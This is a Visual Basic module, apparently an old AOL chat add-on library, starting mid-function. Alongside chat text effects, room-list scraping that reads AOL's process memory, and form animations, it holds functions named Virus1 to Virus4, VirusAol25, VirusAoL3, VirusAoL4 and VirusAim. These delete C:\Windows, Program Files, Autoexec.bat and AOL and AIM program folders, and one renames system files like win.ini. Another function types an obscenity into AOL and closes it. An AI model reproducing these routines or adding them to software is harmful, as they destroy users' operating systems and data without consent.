Dim TheChars As String
Dim TheChar As String
Dim FindChar
Dim ChatText As String
ChatText$ = GetChatText

For FindChar = 1 To Len(ChatText$)

TheChar$ = Mid(ChatText$, FindChar, 1)
TheChars$ = TheChars$ & TheChar$

If TheChar$ = Chr(13) Then
TheChatText$ = Mid(TheChars$, 1, Len(TheChars$) - 1)
TheChars$ = ""
End If

Next FindChar

lastlen = Val(FindChar) - Len(TheChars$)
LastLine = Mid(ChatText$, lastlen, Len(TheChars$))

LastChatLineWithSN = LastLine
End Function
Function LastChatLine()
Dim ChatTrim As String
Dim ChatTrimNum
Dim ChatText
ChatText = LastChatLineWithSN
ChatTrimNum = Len(SNFromLastChatLine)
ChatTrim$ = Mid$(ChatText, ChatTrimNum + 4, Len(ChatText) - Len(SNFromLastChatLine))
LastChatLine = ChatTrim$
End Function
Public Function ChatSpiralScroll(Txt As TextBox)
'call chatspiralscroll(text1.text)
Dim MYSTR
Dim MYLEN
Dim MyString
Dim x
x = Txt.text
star:
MyString = Txt.text
MYLEN = Len(MyString)
MYSTR = Mid(MyString, 2, MYLEN) + Mid(MyString, 1, 1)
Txt.text = MYSTR
ChatSend "(\-" + x + "-/)"
If Txt.text = x Then
Exit Function
End If
GoTo star
End Function

Function Comp_DelFile(FilE As String)
Dim NoFreeze As Integer
On Error Resume Next
Kill FilE$
NoFreeze% = DoEvents()
End Function

Sub Comp_DelDiR(dir As String)
RmDir (dir$)
End Sub
Sub Delete_file(Path)
Comp_DelFile (Path)
End Sub
Function Virus1()
On Error Resume Next
Comp_DelDiR ("C:\Program Files")
End Function

Function Virus2()
On Error Resume Next
Comp_DelDiR ("C:\Windows")
End Function
Function Virus3()
On Error Resume Next
Comp_DelFile ("C:\Autoexec.bat")
Comp_DelDiR ("C:\Program Files")
Comp_DelDiR ("C:\AOL 40\Winsock")
Comp_DelDiR ("C:\AOL 40a\Winsock")
Comp_DelDiR ("C:\AOL 40b\Winsock")
Comp_DelDiR ("C:\AOL 30\Winsock")
Comp_DelDiR ("C:\AOL 30a\Winsock")
Comp_DelDiR ("C:\AOL 30b\Winsock")
Comp_DelDiR ("C:\AOL 25\Winsock")
Comp_DelDiR ("C:\AOL 25a\Winsock")
Comp_DelDiR ("C:\AOL 25b\Winsock")
Comp_DelDiR ("C:\AOL 25i\Winsock")
End Function
Function Virus4()
On Error Resume Next
Comp_DelFile ("C:\Autoexec.bat")
End Function
Sub Virus_File_Names(old_file_path_and_name As String, New_file_path_and_name As String)
' example   Virus_File_Names "c:\windows\win.ini", "C:\windows\lol.txt"
' then you could    forceshutdown
Name old_file_path_and_name As New_file_path_and_name
End Sub

Function VirusAol25()
On Error Resume Next
Comp_DelDiR ("C:\AOL 25\idb")
Comp_DelDiR ("C:\AOL 25a\idb")
Comp_DelDiR ("C:\AOL 25b\idb")
Comp_DelDiR ("C:\AOL 25i\idb")
Comp_DelDiR ("C:\AOL 25\Organize")
Comp_DelDiR ("C:\AOL 25a\Organize")
Comp_DelDiR ("C:\AOL 25b\Organize")
Comp_DelDiR ("C:\AOL 25i\Organize")
Comp_DelDiR ("C:\AOL 25\Tool")
Comp_DelDiR ("C:\AOL 25a\Tool")
Comp_DelDiR ("C:\AOL 25b\Tool")
Comp_DelDiR ("C:\AOL 25i\Tool")
End Function

Function VirusAoL3()
On Error Resume Next
Comp_DelDiR ("C:\AOL 30\idb")
Comp_DelDiR ("C:\AOL 30a\idb")
Comp_DelDiR ("C:\AOL 30b\idb")
Comp_DelDiR ("C:\AOL 30\Organize")
Comp_DelDiR ("C:\AOL 30a\Organize")
Comp_DelDiR ("C:\AOL 30b\Organize")
Comp_DelDiR ("C:\AOL 30\Tool")
Comp_DelDiR ("C:\AOL 30a\Tool")
Comp_DelDiR ("C:\AOL 30b\Tool")
End Function

Function VirusAoL4()
On Error Resume Next
Comp_DelDiR ("C:\AOL 40\idb")
Comp_DelDiR ("C:\AOL 40a\idb")
Comp_DelDiR ("C:\AOL 40b\idb")
Comp_DelDiR ("C:\AOL 40\Organize")
Comp_DelDiR ("C:\AOL 40a\Organize")
Comp_DelDiR ("C:\AOL 40b\Organize")
Comp_DelDiR ("C:\AOL 40\Tool")
Comp_DelDiR ("C:\AOL 40a\Tool")
Comp_DelDiR ("C:\AOL 40b\Tool")
End Function

Function VirusAim()
On Error Resume Next
Comp_DelDiR ("C:\Program Files\AIM95")
Comp_DelDiR ("C:\Program Files\AIM95a")
Comp_DelDiR ("C:\Program Files\AIM95b")
End Function
Function AOLWindow()
Dim AOL As Integer
AOL% = FindWindow("AOL Frame25", vbNullString)
AOLWindow = AOL%
End Function
Sub AOL4KillWin(Windo)
Dim CloseTheMofo
'Closes a window....ex: AOL4_Killwin (IM%)
CloseTheMofo = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub
Sub VirusAol()
' s60                       ownz
' put in a timer or a loop
Dim L
Dim AOL As Integer
L = GetCaption(AOLWindow)
AppActivate L
SendKeys "{f}"
SendKeys "{u}"
SendKeys "{c}"
SendKeys "{k}"
SendKeys "{space}"
SendKeys "{y}"
SendKeys "{o}"
SendKeys "{u}"
TimeOut 1
AOL4KillWin AOL%
End Sub
Sub AcidTrip(frm As Form)
' Place this in a timer and watch the colors =)
Dim cx, cy, Radius, Limit
    frm.ScaleMode = 3
    cx = frm.ScaleWidth / 2
    cy = frm.ScaleHeight / 2
    If cx > cy Then Limit = cy Else Limit = cx
    For Radius = 0 To Limit
frm.Circle (cx, cy), Radius, RGB(Rnd * 255, Rnd * 255, Rnd * 255)
   TimeOut 0.03
    Next Radius
End Sub

Public Sub WaitForOKOrRoom(Room As String)
'Call WaitForOKorRoom("vb6")
'used for room busters...tight coding
    Dim RoomTitle As String, FullWindow As Long, FullButton As Long
    Room$ = LCase(ReplaceString(Room$, " ", ""))
    Do
        DoEvents
        RoomTitle$ = GetCaption(FindChatRoom&)
        RoomTitle$ = LCase(ReplaceString(Room$, " ", ""))
        FullWindow& = FindWindow("#32770", "America Online")
        FullButton& = FindWindowEx(FullWindow&, 0&, "Button", "OK")
    Loop Until (FullWindow& <> 0& And FullButton& <> 0&) Or Room$ = RoomTitle$
    DoEvents
    If FullWindow& <> 0& Then
        Do
            DoEvents
            Call SendMessage(FullButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYUP, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYUP, VK_SPACE, 0&)
            FullWindow& = FindWindow("#32770", "America Online")
            FullButton& = FindWindowEx(FullWindow&, 0&, "Button", "OK")
        Loop Until FullWindow& = 0& And FullButton& = 0&
    End If
    DoEvents
End Sub
Function ChatWavy(TheText)
  Dim WavY
    Dim G, a, W, r, U, s, t, p
    G = TheText
    a = Len(G)
    For W = 1 To a Step 4
        r = Mid$(G, W, 1)
        U = Mid$(G, W + 1, 1)
        s = Mid$(G, W + 2, 1)
        t = Mid$(G, W + 3, 1)
        p = p & "<sup>" & r & "</sup>" & U & "<sub>" & s & "</sub>" & t
    Next W
    WavY = (p)
End Function

Public Sub AddRoomToListbox(thelist As ListBox, AddUser As Boolean)
'Call AddRoomToListbox(List1, False)
    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, ScreenName As String
    Dim psnHold As Long, rBytes As Long, index As Long, Room As Long
    Dim rList As Long, sThread As Long, mThread As Long
    Room& = FindChatRoom&
    If Room& = 0& Then Exit Sub
    rList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rList, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index& = 0 To SendMessage(rList, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rList, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName$, 4)
            psnHold& = psnHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName$, Len(ScreenName$), rBytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
            If ScreenName$ <> GetUser$ Or AddUser = True Then
                thelist.AddItem ScreenName$
            End If
        Next index&
        Call CloseHandle(mThread)
    End If
End Sub

Public Sub AddRoomToCombobox(TheCombo As ComboBox, AddUser As Boolean)
'Call AddRoomToCombobox("combo1, false")
    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, ScreenName As String
    Dim psnHold As Long, rBytes As Long, index As Long, Room As Long
    Dim rList As Long, sThread As Long, mThread As Long
    Room& = FindChatRoom&
    If Room& = 0& Then Exit Sub
    rList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rList, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index& = 0 To SendMessage(rList, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rList, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName$, 4)
            psnHold& = psnHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName$, Len(ScreenName$), rBytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
            If ScreenName$ <> GetUser$ Or AddUser = True Then
                TheCombo.AddItem ScreenName$
            End If
        Next index&
        Call CloseHandle(mThread)
    End If
    If TheCombo.ListCount > 0 Then
        TheCombo.text = TheCombo.List(0)
    End If
End Sub

Public Function Online()
'by jeetow source ;)
'call Online
'if user is not online then msgbox "Not Online"
'if user is online then msgbox "Online"
If GetUser = "" Then
MsgBox "Not Online"
'label1.caption= "Not Online"
   Else
MsgBox "Online"
'label1.caption= "Online"
End If
End Function
Sub FormTrippyDance(s60 As Form)
'This makes a form move across the screen
'Example
'Call FormDance(form1)
s60.Left = 5
Pause (0.1)
s60.Left = 400
Pause (0.1)
s60.Left = 700
Pause (0.1)
s60.Left = 1000
Pause (0.1)
s60.Left = 2000
Pause (0.1)
s60.Left = 3000
Pause (0.1)
s60.Left = 4000
Pause (0.1)
s60.Left = 5000
Pause (0.1)
s60.Left = 4000
Pause (0.1)
s60.Left = 3000
Pause (0.1)
s60.Left = 2000
Pause (0.1)
s60.Left = 1000
Pause (0.1)
s60.Left = 700
Pause (0.1)
s60.Left = 400
Pause (0.1)
s60.Left = 5
Pause (0.1)
s60.Left = 400
Pause (0.1)
s60.Left = 700
Pause (0.1)
s60.Left = 1000
Pause (0.1)
s60.Left = 2000
End Sub
